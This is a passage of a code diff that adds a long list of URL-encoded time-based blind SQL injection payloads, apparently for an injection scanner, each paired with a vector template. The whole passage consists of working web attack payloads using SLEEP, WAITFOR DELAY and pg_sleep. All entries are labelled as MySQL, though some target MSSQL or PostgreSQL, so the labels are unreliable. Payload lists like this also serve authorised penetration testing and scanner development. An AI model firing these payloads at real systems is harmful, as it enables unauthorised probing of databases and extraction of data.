+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20XOR(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))XOR",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20SECOND(IF(1=1,SLEEP(SECOND(10)),0))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(pg_sleep(dexp(10)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(pg_sleep(dexp(10)))--%20",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%7C(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%26(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%26(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%26(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%26(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(last_day(if(now()=sysdate(),sleep(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20and%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20and%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20and%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%00'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%08'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%11'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20%1D'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20WAITFOR%20DELAY%20N'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
